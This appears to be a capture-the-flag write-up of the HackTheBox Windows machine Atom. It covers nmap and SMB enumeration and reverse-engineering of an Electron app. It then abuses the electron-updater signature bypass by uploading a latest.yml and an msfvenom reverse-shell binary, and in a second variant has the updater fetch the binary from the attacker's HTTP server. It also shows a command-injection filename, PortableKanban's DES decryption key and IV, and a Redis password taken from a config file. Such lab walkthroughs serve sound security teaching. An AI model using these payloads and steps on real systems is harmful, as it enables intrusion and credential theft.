---
title: HTB: Atom
url: https://0xdf.gitlab.io/2021/07/10/htb-atom.html
date: 2021-07-10T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, htb-atom, hackthebox, nmap, xampp, redis, reverse-engineering, portable-kanban, smbmap, smbclient, crackmapexec, feroxbuster, asar, nodejs, electron, wireshark, msfvenom, cyberchef, printnightmare, invoke-nightmare, cve-2021-34527, htb-sharp, oscp-plus-v2, oscp-plus-v3
---

![Atom](https://0xdfimages.gitlab.io/img/atom-cover.png)

Atom was a box that involved insecure permissions on an update server, which allowed me to write a malicious payload to that server and get execution when an Electron App tried to update from my host. I’ll reverse the electron app to understand the tech, and exploit it to get a shell. For root, I’ll have to exploit a Portable-Kanban instance which is using Redis to find a password. In Beyond Root, a quick visit back to PrintNightmare.

## Box Info

| Name | [Atom](https://hackthebox.com/machines/atom)  [Atom](https://hackthebox.com/machines/atom) [Play on HackTheBox](https://hackthebox.com/machines/atom) |
| --- | --- |
| Release Date | [17 Apr 2021](https://twitter.com/hackthebox_eu/status/1382706316012032004) |
| Retire Date | 10 Jul 2021 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Atom |
| Radar Graph | Radar chart for Atom |
| First Blood User | 01:24:38[gumby gumby](https://app.hackthebox.com/users/187281) |
| First Blood Root | 01:59:57[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` found seven open TCP ports, HTTP (80), HTTPS (443), RPC (135), SMB (445), WinRM (5985), Redis (6379), and something on 7680:

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.237
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 08:35 EDT
Nmap scan report for atom.htb (10.10.10.237)
Host is up (0.70s latency).
Not shown: 65528 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  wsman
6379/tcp open  redis
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 113.47 seconds
oxdf@parrot$ nmap -p 80,135,443,445,5985,6379,7680 -sCV -oA scans/nmap-tcpscripts 10.10.10.237
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 08:40 EDT
Nmap scan report for atom.htb (10.10.10.237)
Host is up (0.15s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
7680/tcp open  pando-pub?
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m03s, deviation: 4h02m32s, median: 1s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-16T05:41:48-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-16T12:41:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.05 seconds

```

SMB reports that the OS is Windows 10 Pro, and the hostname is Atom. Apache on Windows suggests [XAMPP](https://www.apachefriends.org/index.html), but could be something else. The TLS script doesn’t give any virtual host names. Looking at the certificate in Firefox doesn’t give any additional information.

### Redis - TCP 6379

I can connect to Redis with `nc` or `redis-cli`. Either way, it rejects me for lack of auth:

```

oxdf@parrot$ nc 10.10.10.237 6379
keys *
-NOAUTH Authentication required.

^C
oxdf@parrot$ redis-cli -h 10.10.10.237
10.10.10.237:6379> keys *
(error) NOAUTH Authentication required.

```

I’ll come back later if I can get creds.

### SMB - TCP 445

#### List Shares

`smbmap` with no username/password just returns an auth error, but when I give it a user that doesn’t exist, it gets a guest session and shows four shares:

```

oxdf@parrot$ smbmap -H 10.10.10.237
[!] Authentication error on 10.10.10.237
oxdf@parrot$ smbmap -H 10.10.10.237 -u oxdf -p oxdf
[+] Guest session       IP: 10.10.10.237:445    Name: 10.10.10.237                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Software_Updates                                        READ, WRITE

```

`smbclient` can also list the shares:

```

oxdf@parrot$ smbclient -N -L //10.10.10.237

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Software_Updates Disk      
SMB1 disabled -- no workgroup available

```

`crackmapexec` behaves similarly to `smbmap`:

```

oxdf@parrot$ crackmapexec smb 10.10.10.237 --shares -u oxdf -p oxdf
SMB         10.10.10.237    445    ATOM             [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True)
SMB         10.10.10.237    445    ATOM             [+] ATOM\oxdf:oxdf 
SMB         10.10.10.237    445    ATOM             [+] Enumerated shares
SMB         10.10.10.237    445    ATOM             Share           Permissions     Remark
SMB         10.10.10.237    445    ATOM             -----           -----------     ------
SMB         10.10.10.237    445    ATOM             ADMIN$                          Remote Admin
SMB         10.10.10.237    445    ATOM             C$                              Default share
SMB         10.10.10.237    445    ATOM             IPC$                            Remote IPC
SMB         10.10.10.237    445    ATOM             Software_Updates READ,WRITE 

```

The only non-standard share is `Software_Updates`, and a guest session has read and write privileges.

#### Software\_Updates

This share has a PDF, and three directories:

```

oxdf@parrot$ smbclient //10.10.10.237/Software_Updates
Enter WORKGROUP\oxdf's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 15 15:07:25 2021
  ..                                  D        0  Thu Apr 15 15:07:25 2021
  client1                             D        0  Thu Apr 15 08:05:39 2021
  client2                             D        0  Thu Apr 15 08:05:39 2021
  client3                             D        0  Thu Apr 15 08:05:39 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 07:18:08 2021

                4413951 blocks of size 4096. 1359252 blocks available

```

The directories are all empty. I’ll grab the PDF:

```

smb: \> get UAT_Testing_Procedures.pdf
getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (37.2 KiloBytes/sec) (average 37.2 KiloBytes/sec)

```

#### UAT\_Testing\_Procedures.pdf

The document is an internal document describing the testing procedures for Heed:

![image-20210415151433401](https://0xdfimages.gitlab.io/img/image-20210415151433401.png)

The documentation admits that the application doesn’t do much yet. The quality assurance (QA) section does provide some hints as to places to look for vulnerabilities:

> We follow the below process before releasing our products.
>
> 1. Build and install the application to make sure it works as we expect it to be.
> 2. Make sure that the update server running is in a private hardened instance. To
>    initiate the QA process, just place the updates in one of the “client” folders, and
>    the appropriate QA team will test it to ensure it finds an update and installs it
>    correctly.
> 3. Follow the checklist to see if all given features are working as expected by the
>    developer.

It looks like updates to the software are tested by putting them into one of the `client` folders from the SMB share.

### Website - TCP 80/443

Both HTTP and HTTPS seem to return the same site, which is for a software company, Heed Solutions:

[![image-20210415145842387](https://0xdfimages.gitlab.io/img/image-20210415145842387.png)](https://0xdfimages.gitlab.io/img/image-20210415145842387.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210415145842387.png)

The page has links to download Heed, the note taking application mentioned in the QA documentation. There’s only a Windows version right now, as Mac and Linux both say “Coming soon”. I’ll grab a copy of the Windows version, which downloads as `heed_setup_v1.0.0.zip`.

I’ll run `ferobuster` against the site, and include `-x php` based on my guess that it could be running XAMPP, but it doesn’t find anything useful.

### Heed RE

I’ll download the Windows package and take a look. From analysis of this binary, I need to get a couple of key pieces of information. I’ll show how to do that from both from Linux and from Windows.

#### From Linux

The zip file contains a single exe:

```

oxdf@parrot$ unzip -l heed_setup_v1.0.0.zip 
Archive:  heed_setup_v1.0.0.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 46579160  2021-04-09 17:07   heedv1 Setup 1.0.0.exe
---------                     -------
 46579160                     1 file

```

The EXE is a Nullsoft Installer self-extracting archive:

```

oxdf@parrot$ file heedv1\ Setup\ 1.0.0.exe 
heedv1 Setup 1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive

```

Within my Parrot VM, double clicking the EXE will open it in the archive manager:

[![image-20210415153152539](https://0xdfimages.gitlab.io/img/image-20210415153152539.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210415153152539.png)

There’s an uninstall executable, and a `$PLUGINSDIR`. Inside the directory, there are several linked libraries (`.dll` files) and a `app-64.7z`:

[![image-20210415153303742](https://0xdfimages.gitlab.io/img/image-20210415153303742.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210415153303742.png)

I recognize this format from the [2020 Holiday Hack](/holidayhack2020/3#point-of-sale-password-recovery) as an Electron application, but some Goolging could get you there as well. I’ll decompress the `app-64.7z`. There’s a bunch of stuff in here, most of which I can ignore:

[![image-20210415154356974](https://0xdfimages.gitlab.io/img/image-20210415154356974.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210415154356974.png)

Electron applications bring along everything they need to run a JavaScript/HTML-based application, so things that start with `chrome` and `v8` are just that. In `resources`, there’s an `app.asar` file, which is what contains the JavaScript and HTML templates for the application.

I’ll install [ASAR tool](https://github.com/electron/asar) with `npm -g install asar`, and then run it to list the files:

```

oxdf@parrot$ asar l app.asar                                    
/createNote.html                                               
/main.js                                                    
/package.json                                                 
/version.html                                              
/icons                                                        
/icons/ico.png                                          
/node_modules                                  
/node_modules/argparse

```

The `ef` command will extract a file from the `.asar`, in this case, `main.js`:

```

oxdf@parrot$ asar ef app.asar main.js

```

Looking at the `require` statements at the top, it is bringing in a couple packages:

```

const {app, BrowserWindow, Menu, protocol, ipcMain} = require('electron');
const log = require('electron-log');
const {autoUpdater} = require("electron-updater");
const path = require('path');

```

Since there’s already a lot of themes around updates, `electron-updater` is interesting. At the top of the application, the logging for the updater is set:

```

autoUpdater.logger = log;
autoUpdater.logger.transports.file.level = 'debug';

```

At the bottom, it defines a bunch of actions and then calls `checkForUpdates()`:

```

autoUpdater.on('checking-for-update', () => {
  sendStatusToWindow('Checking for update...');
})
autoUpdater.on('update-available', (ev, info) => {
  sendStatusToWindow('Update available.');
})
autoUpdater.on('update-not-available', (ev, info) => {
  sendStatusToWindow('Update not available.');
})
autoUpdater.on('error', (ev, err) => {
  sendStatusToWindow('Error in auto-updater.');
})
autoUpdater.on('download-progress', (ev, progressObj) => {
  sendStatusToWindow('Download progress...');
})
autoUpdater.on('update-downloaded', (ev, info) => {
  sendStatusToWindow('Update downloaded; Installing the update...');
});

app.on('window-all-closed', () => {
  app.quit();
});

autoUpdater.on('update-downloaded', (ev, info) => {
  autoUpdater.quitAndInstall();
})

app.on('ready', function()  {
  autoUpdater.checkForUpdates();
});

```

In the `resources` directory there’s also a `app-update.yml`:

```

provider: generic
url: 'http://updates.atom.htb'
publisherName:
  - HackTheBox

```

I’ll add `updates.atom.htb` (and `atom.htb`) to my `/etc/hosts` file.

#### From Windows

I could find the same information using a Windows VM. If I run the binary, the Heed application pops up:

![image-20210419131223794](https://0xdfimages.gitlab.io/img/image-20210419131223794.png)

“Error in auto-updater.” at the bottom right is interesting. If I fire up Wireshark and open Heed again, the immediate issue becomes apparent:

![image-20210419131947921](https://0xdfimages.gitlab.io/img/image-20210419131947921.png)

The term “auto-updater” is hyphenated in such a way that it looks like it might be a proper name. Doing the same kind of analysis on the archive that I did above on Linux, I can determine that this is an electron application, and that on it’s own is enough to move to the next step. Still, I could add that IP to my hosts file at `c:\windows\system32\drivers\etc\hosts`:

```
10.10.10.237 updates.atom.htb

```

On closing and re-opening Heed, there’s a failed GET request to Atom for `latest.yml`:

![image-20210419133802315](https://0xdfimages.gitlab.io/img/image-20210419133802315.png)

## Shell as jason

### Exploit

#### Find

Via enumeration in either OS, I’ll have terms like “electron-updater” or “latest.yml auto-updater exploit”, and these terms interesting stuff in Google:

![image-20210415155409394](https://0xdfimages.gitlab.io/img/image-20210415155409394.png)

The same links come up with the terms identified in the windows analysis.

#### Exploit Details

[This post](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html) gives a good breakdown of the vulnerability and exploit, as well as some background:

> During a software update, the application will request a file named latest.yml from the update server, which contains the definition of the new release - including the binary filename and hashes.

The idea is that I can bypass any signature checks on updates by breaking the script that manages that, specifically by putting a `'` in the filename. The example file they give is:

```

version: 1.2.3
files:
  - url: v’ulnerable-app-setup-1.2.3.exe
  sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==
  size: 44653912
path: v'ulnerable-app-1.2.3.exe
sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==
releaseDate: '2019-11-20T11:17:02.627Z'

```

There’s also a command injection vuln that looks like:

```

version: 1.2.3
files:
  - url: v';calc;'ulnerable-app-setup-1.2.3.exe
  sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==
  size: 44653912
path: v';calc;'ulnerable-app-1.2.3.exe
sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==
releaseDate: '2019-11-20T11:17:02.627Z'

```

### Shell

I’ll show two ways to do this, both very similar, but first by uploading the payload, and then serving it over HTTP.

#### Local

This tracks with how the article shows the update and the `latest.yml`.

I’ll build an executable that will provide a reverse shell using `msfvenom`:

```

oxdf@parrot$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

```

The `latest.yml` file needs a base64 SHA512, which is easy to calculate using the example in the post:

```

oxdf@parrot$ sha512sum rev.exe | cut -d ' ' -f1 | xxd -r -p | base64 -w0
94WZYO7lW9xUcWqtf7bcuLtrgFk50zeHWuXLF143BKErDzqK0saJz550GS4py14J8wDP6cvMeZI5zruNYf8gOg==

```

All of that goes into the `latest.yml` file:

```

version: 2.2.3
files:
  - url: r'ev.exe
    sha512: 94WZYO7lW9xUcWqtf7bcuLtrgFk50zeHWuXLF143BKErDzqK0saJz550GS4py14J8wDP6cvMeZI5zruNYf8gOg==
    size: 7168     
path: r'ev.exe
sha512: 94WZYO7lW9xUcWqtf7bcuLtrgFk50zeHWuXLF143BKErDzqK0saJz550GS4py14J8wDP6cvMeZI5zruNYf8gOg==
releaseDate: '2021-04-17T11:17:02.627Z'

```

The `url` is the binary name with a `'` in it to break validation. I set the `size` to the correct size, but it doesn’t matter. Same thing with `releaseDate`, which can be any valid date string, or just omitted. One thing that cost me a ton of time - the example in the post has invalid spacing! `sha512` and `size` should be lined up with `url`, not with `-`.

I’ll upload the `latest.yml` and the binary to one of the client folders, making sure to update the name of `rev.exe` to `r'ev.exe` to match what’s in the `latest.yml`:

```

smb: \client1\> put latest.yml
putting file latest.yml as \client1\latest.yml (0.7 kb/s) (average 8.1 kb/s)
smb: \client1\> put rev.exe r'ev.exe
putting file rev.exe as \client1\r'ev.exe (17.2 kb/s) (average 8.8 kb/s)

```

Within a minute, there’s a shell at the listening `nc`:

```

oxdf@parrot$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.237] 50128
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
atom\jason

```

There’s no shell upgrade in Windows, but I do use `rlwrap` to get access to the arrow keys. If you prefer PowerShell to Cmd, you can run `powershell` to get that prompt.

`user.txt` is also now available:

```

C:\Users\jason\desktop>type user.txt
3bb5552e************************

```

#### Remote

When helping a friend with Atom later, I noticed that the field was `url`, and while I was putting a local file next to `latest.yml` on the server, it seems logical that exploit also works with the payload remotely. I’ll create another YAML file:

```

version: 2.2.5
files:
  - url: http://10.10.14.7/r'ev.exe
    sha512: xYmfwTcneb8dT4kVFeUtvyrEGi1iiJvqrU1PaLPMC/omejOR7f0gyOT1lTv8pjcXXr6kR0u8rAxg4Sd5zk/fOw==
    size: 7168
path: r'ev.exe
sha512: xYmfwTcneb8dT4kVFeUtvyrEGi1iiJvqrU1PaLPMC/omejOR7f0gyOT1lTv8pjcXXr6kR0u8rAxg4Sd5zk/fOw==
releaseDate: '2021-04-17T11:17:02.627Z

```

The only thing I changed is the `url` is now pointing at my host. I’ll upload this to Atom:

```

smb: \client1\> put latest-remote.yml latest.yml
putting file latest-remote.yml as \client1\latest.yml (4.8 kb/s) (average 4.8 kb/s)

```

Each minute, there are two connections to my webserver:

```

oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.237 - - [10/Jul/2021 07:07:13] code 404, message File not found
10.10.10.237 - - [10/Jul/2021 07:07:13] "GET /r'ev.exe.blockmap HTTP/1.1" 404 -
10.10.10.237 - - [10/Jul/2021 07:07:13] code 404, message File not found
10.10.10.237 - - [10/Jul/2021 07:07:13] "GET /r%27ev.exe HTTP/1.1" 404 -

```

If I put the payload there:

```

oxdf@parrot$ cp rev.exe "r'ev.exe"

```

Then it still doesn’t find `r'ev.exe.blockmap`, but it does find `r'ev.exe` (see the 200 status code):

```
10.10.10.237 - - [10/Jul/2021 07:08:13] code 404, message File not found
10.10.10.237 - - [10/Jul/2021 07:08:13] "GET /r'ev.exe.blockmap HTTP/1.1" 404 -
10.10.10.237 - - [10/Jul/2021 07:08:13] "GET /r%27ev.exe HTTP/1.1" 200 -

```

And it runs, as a reverse shell connects back:

```

oxdf@parrot$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.237] 63974
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>

```

Interestingly, when the request for the `.exe` file was 404, Atom would hit the web server every minute. It seems like perhaps that attempting to get a file but not finding it would break the process such that the cleanup on Atom didn’t continue. Once I put an executable there, everything was cleaned up.

## Shell as administrator

### Enumeration

#### PortableKanban

In Jason’s `Downloads` directory, there are two folders:

```

PS C:\Users\jason\downloads> ls

    Directory: C:\Users\jason\downloads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/31/2021   2:36 AM                node_modules
d-----          4/2/2021   8:21 PM                PortableKanban

```

`node_modules` is almost certainly related to the Heed application, but `PortableKanban` is not. Googling for “portablekanban”, the first hit is an ExploitDB post, just before the link to the actual software:

![image-20210416085032031](https://0xdfimages.gitlab.io/img/image-20210416085032031.png)

[The post](https://www.exploit-db.com/exploits/49409) is a Python script, which I also looked at in detail for [Sharp](/2021/05/01/htb-sharp.html#portable-kanban):

> ```

> # PortableKanBan stores credentials in an encrypted format
> # Reverse engineering the executable allows an attacker to extract credentials from local storage
> # Provide this program with the path to a valid PortableKanban.pk3 file and it will extract the decoded credentials
>
> ```

It looks like the creds are just base64-decoded, and then decrypted using DES with a key of “7ly6UznJ” and an IV of “XuVUm5fR”.

In Sharp, there was a local config file to decrypt. Unfortunately, I don’t see a `PortableKanban.pk3` file on Atom:

```

PS C:\Users\jason\downloads\PortableKanban> ls

    Directory: C:\Users\jason\downloads\PortableKanban

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/2/2021   7:44 AM                Files
d-----          4/2/2021   7:17 AM                Plugins
-a----         2/27/2013   7:06 AM          58368 CommandLine.dll
-a----         11/8/2017  12:52 PM         141312 CsvHelper.dll
-a----         6/22/2016   9:31 PM         456704 DotNetZip.dll
-a----        11/23/2017   3:29 PM          23040 Itenso.Rtf.Converter.Html.dll
-a----        11/23/2017   3:29 PM          75776 Itenso.Rtf.Interpreter.dll
-a----        11/23/2017   3:29 PM          32768 Itenso.Rtf.Parser.dll
-a----        11/23/2017   3:29 PM          19968 Itenso.Sys.dll
-a----        11/23/2017   3:29 PM         376832 MsgReader.dll
-a----          7/3/2014  10:20 PM         133296 Ookii.Dialogs.dll
-a----          4/2/2021   8:22 PM           5920 PortableKanban.cfg
-a----          1/4/2018   8:12 PM         118184 PortableKanban.Data.dll
-a----          1/4/2018   8:12 PM        1878440 PortableKanban.exe
-a----          1/4/2018   8:12 PM          31144 PortableKanban.Extensions.dll
-a----          4/2/2021   7:21 AM            172 PortableKanban.pk3.lock
-a----          9/6/2017  12:18 PM         413184 ServiceStack.Common.dll
-a----          9/6/2017  12:17 PM         137216 ServiceStack.Interfaces.dll
-a----          9/6/2017  12:02 PM         292352 ServiceStack.Redis.dll
-a----          9/6/2017   4:38 AM         411648 ServiceStack.Text.dll
-a----          1/4/2018   8:14 PM        1050092 User Guide.pdf

```

`PortableKanban.pk3.lock` has potential, but where the script loads the json and looks for the `users` key, there is no `users` key in this file:

```

PS C:\Users\jason\downloads\PortableKanban>type PortableKanban.pk3.lock
{"MachineName":"ATOM","UserName":"jason","SID":"S-1-5-21-1199094703-3580107816-3092147818-1002","AppPath":"C:\\Users\\jason\\Downloads\\PortableKanban\\PortableKanban.exe"}

```

The config file is a giant JSON blob:

```

PS C:\Users\jason\downloads\PortableKanban> cat PortableKanban.cfg
{"RoamingSettings":{"DataSource":"RedisServer","DbServer":"localhost","DbPort":6379,"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb","DbServer2":"","DbPort2":6379,"DbEncPassword2":"","DbIndex":0,"DbSsl":false,"DbTimeout":10,"FlushChanges":true,"UpdateInterval":5,"AutoUpdate":true,"Caption":"My Tasks","RightClickAction":"Nothing","DateTimeFormat":"ddd, M/d/yyyy h:mm tt","BoardForeColor":"WhiteSmoke","BoardBackColor":"DimGray","ViewTabsFont":"Segoe UI, 9pt","SelectedViewTabForeColor":"WhiteSmoke","SelectedViewTabBackColor":"Black","HeaderFont":"Segoe UI, 11.4pt","HeaderShowCount":true,"HeaderShowLimit":true,"HeaderShowEstimates":true,"HeaderShowPoints":false,"HeaderForeColor":"WhiteSmoke","HeaderBackColor":"Gray","CardFont":"Segoe UI, 11.4pt","CardLines":3,"CardTextAlignment":"Center","CardShowMarks":true,"CardShowInitials":false,"CardShowTags":true,"ThickTags":false,"DefaultTaskForeColor":"WhiteSmoke","DefaultTaskBackColor":"Gray","SelectedTaskForeColor":"WhiteSmoke","SelectedTaskBackColor":"Black","SelectedTaskFrames":false,"SelectedTaskFrameColor":"WhiteSmoke","SelectedTaskThickFrames":false,"WarmTasksThreshold":0,"WarmTaskForeColor":"WhiteSmoke","WarmTaskBackColor":"MediumBlue","WarmTaskFrameColor":"Goldenrod","HotTasksThreshold":1,"HotTaskForeColor":"WhiteSmoke","HotTaskBackColor":"Blue","HotTaskFrameColor":"Yellow","OverdueTaskForeColor":"WhiteSmoke","OverdueTaskBackColor":"OrangeRed","OverdueTaskFrameColor":"OrangeRed","WarmHotTaskFrames":false,"WarmHotTaskThickFrames":false,"BusinessDaysOnly":false,"TrackedTaskForeColor":"WhiteSmoke","TrackedTaskBackColor":"Red","ShowSubtasksInEditBox":true,"CheckForDuplicates":true,"WarnBeforeDeleting":true,"ProgressIncrement":5,"DisableCreated":false,"DefaultPriority":"Low","DefaultDeadlineTime":"PT0S","ShowTaskComments":true,"IntervalFormat":"Hours","WorkUnitDuration":1,"SelectAnyColumn":false,"ShowInfo":true,"CardInfoFont":"Segoe UI, 9pt","InfoTextAlignment":"Center","InfoShowPriority":true,"InfoShowTopic":true,"InfoShowPerson":true,"InfoShowCreated":true,"InfoShowDeadlineCompleted":true,"InfoShowSubtasks":false,"InfoShowEstimate":false,"InfoShowSpent":false,"InfoShowPoints":false,"InfoShowProgress":true,"InfoShowCommentsCount":false,"InfoShowTags":false,"InfoShowCustomFields":false,"ShowToolTips":true,"ToolTipShowText":true,"ToolTipTextLimit":200,"ToolTipShowPriority":true,"ToolTipShowTopic":true,"ToolTipShowPerson":true,"ToolTipShowCreated":false,"ToolTipShowDeadlineCompleted":true,"ToolTipShowSubtasks":true,"ToolTipShowEstimate":true,"ToolTipShowSpent":true,"ToolTipShowPoints":true,"ToolTipShowProgress":true,"ToolTipShowCommentsCount":false,"ToolTipShowTags":false,"ToolTipShowCustomFields":false,"TimerWorkInterval":25,"TimeShortBreakInterval":5,"TimerLongBreakInterval":15,"PlaySound":1000,"ActivateWindow":false,"TaskBarProgress":true,"EnableTimeTracking":true,"AlertOnNewTask":false,"AlertOnModifiedTask":false,"AlertOnCompletedTask":false,"AlertOnCanceledTask":false,"AlertOnReassignedTask":false,"AlertOnMovedTask":false,"AlertOnDeletedTask":false,"AlertMethod":"None","EmailLogon":true,"EmailReviewMessage":true,"EmailSmtpPort":587,"EmailSmtpDeliveryMethod":"Network","EmailSmtpUseDefaultCredentials":false,"EmailSmtpEnableSSL":false,"EmailSmtpTimeout":5,"EmailAttachFile":true,"EmailNewTaskSubject":"PortableKanban Notification: New task has been created","EmailDeletedTaskSubject":"PortableKanban Notification: Task has been deleted","EmailEditedTaskSubject":"PortableKanban Notification: Task has been modified","EmailCompletedTaskSubject":"PortableKanban Notification: Task has been completed","EmailCanceledTaskSubject":"PortableKanban Notification: Task has been canceled","EmailReassignedTaskSubject":"PortableKanban Notification: Task has been reassigned","EmailMovedTaskSubject":"PortableKanban Notification: Task has been moved","EmailSignature":"This is automatic message.","PluginsSettings":{"bd5d2026e1f7424eab8690a62ad05ad2":{},"07a0d797c97c41f789af21ff4298754e":{"SourceColumnId":"00000000000000000000000000000000","DestinationColumnId":"00000000000000000000000000000000","Age":30},"2e470c79feb946f2b6e74b35245f8e80":{"FromDate":"\/Date(1617346800000-0700)\/","ToDate":"\/Date(1617346800000-0700)\/","IncludeTopics":false,"IncludeTags":false,"IncludeComments":false,"ReportType":"Html","SortByUser":true},"680986568fed41c381ef9f230feaa102":{"RunOnStartup":false},"24b7acead7984f8ab16bdb0ae8559fb6":{"TopicId":"00000000000000000000000000000000","ColumnId":"00000000000000000000000000000000","FromPersonId":"00000000000000000000000000000000","ToPersonId":"00000000000000000000000000000000"}},"AutoLogon":false,"LogonUserName":"","EncLogonPassword":"","ExitOnSuspend":false,"DropFilesFolder":"Files","UseRelativePath":true,"ConfirmFileDeleteion":true,"DefaultDropFilesActionOption":"Copy","CreateNewTaskForEachDroppedFile":true,"ParseDroppedEmails":true,"RestoreWindowsLocation":true,"DesktopShortcut":false,"DailyBackup":false,"BackupTime":"PT0S","BlockEscape":false,"BlackWhiteIcon":true,"ShowTimer":true,"ViewId":"00000000000000000000000000000000","SearchInSubtasks":false,"ReportIncludeComments":true,"ReportIncludeSubTasks":true,"ReportIncludeTimeTracks":true,"ReportIncludeCustomFields":true},"LocalSettingsMap":{"ATOM":{"Left":320,"Top":2,"Width":800,"Height":601,"Minimized":false,"Maximized":false,"FullScreen":false,"Hidden":false,"AboutBoxLeft":0,"AboutBoxTop":0,"AboutBoxWidth":0,"AboutBoxHeight":0,"EditBoxLeft":0,"EditBoxTop":0,"EditBoxWidth":0,"EditBoxHeight":0,"EditBoxSplitterOrientation":1,"EditBoxSplitterDistance":0,"EditBoxFontSize":0,"EditBoxCommentsSortDirection":"Ascending","ReportBoxLeft":370,"ReportBoxTop":27,"ReportBoxWidth":700,"ReportBoxHeight":551,"SetupBoxLeft":370,"SetupBoxTop":52,"SetupBoxWidth":700,"SetupBoxHeight":501,"ViewBoxLeft":0,"ViewBoxTop":0,"ViewBoxWidth":0,"ViewBoxHeight":0,"LogonBoxLeft":520,"LogonBoxTop":202,"LogonBoxWidth":400,"LogonBoxHeight":201}}}

```

Right at the front is this part (whitespace added):

```

"DataSource":"RedisServer",
"DbServer":"localhost",
"DbPort":6379,
"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb"

```

The program is using Redis rather than local storage, and there is a Redis server on this host!

#### Redis

I suspect I could try to decrypt that password stored in the PortableKanban config, but looking around in the Redis directory, there’s a config there as well, and printing it (using `select-string` to remove comments and then remove blank lines):

```

PS C:\Program Files\redis> type redis.windows-service.conf | select-string -pattern "^#" -NotMatch | select-string .
requirepass kidvscat_yes_kidvscat      
port 6379                                     
tcp-backlog 511                              
timeout 0
tcp-keepalive 0                  
loglevel notice
logfile "Logs/redis_log.txt"
